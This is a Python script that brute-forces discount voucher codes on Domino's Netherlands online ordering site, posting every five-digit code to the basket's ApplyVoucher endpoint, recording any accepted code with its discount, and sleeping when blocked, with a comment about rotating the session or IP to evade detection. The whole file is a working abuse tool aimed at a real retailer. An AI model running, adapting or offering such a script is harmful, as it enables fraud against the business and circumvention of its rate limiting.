import time
import random
import requests
import calendar
from lxml import html

sessionid = ''
basket = "https://bestellen.dominos.nl/eStore/nl/Basket/"
cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
checkurl = "https://bestellen.dominos.nl/eStore/nl/Basket/GetBasketView?#"


class PizzaBoy:

    def __init__(self):
        self.name = random.choice(['Donatello', 'Leonardo', 'Michelangelo', 'Rafael'])
        self.greet()

    def greet(self):
        print("Hello, my name is {0}. I am your Pizza Boy".format(self.name))

    def run(self):
        print("Checking codes")
        for code in range(0, 99999):
            code = self.adapt_code(code) if code < 10000 else str(code)
            self.try_code(code)

    def try_code(self, code):
        result = self.send_code(code)
        if result:
            discount = self.get_discount_from_basket()
            self.remove_code_from_basket()
            self.remember_code_and_discount(code, discount)
            self.say_code_and_discount(code, discount)

    def send_code(self, code):
        url = basket + "ApplyVoucher?voucherCode=" + str(code)
        r = requests.post(url, cookies=cookies)
        response = r.text

        if (r.status_code!=200):
            self.go_to_sleep(3600)
            return False

        return '{"Url":null,"Messages":null}' in response

    @staticmethod
    def get_discount_from_basket():
        r = requests.get(checkurl, cookies=cookies)
        parsed = html.fromstring(r.text)
        description = parsed.find_class('description')
        return description[0].text_content()

    @staticmethod
    def remove_code_from_basket():
        timestamp = str(calendar.timegm(time.gmtime())) + '00'
        for orderitem in range(1, 6):
            removeurl = '{0}RemoveVoucher?orderItemId={1}&timestamp={2}{3}'.format(basket, str(orderitem), timestamp, str(orderitem))
            requests.post(removeurl, cookies=cookies)

    @staticmethod
    def go_to_sleep(seconds):
        # todo: maybe reset the session id, or even ip
        print('I was denied access. Going to sleep for a bit')
        time.sleep(seconds)

    @staticmethod
    def adapt_code(code):
        codestring = str(code)
        prefix = '0' * (5 - len(codestring))
        return prefix + codestring

    @staticmethod
    def remember_code_and_discount(code, discount):
        with open('codes.txt', 'w') as file:
            file.write('code: {0}\tdiscount: {1}\n'.format(code, discount))

    @staticmethod
    def say_code_and_discount(code, discount):
        print('code: {0}\tdiscount: {1}'.format(code, discount))


def main():
    pb = PizzaBoy()
    pb.run()

if __name__ == '__main__':
    main()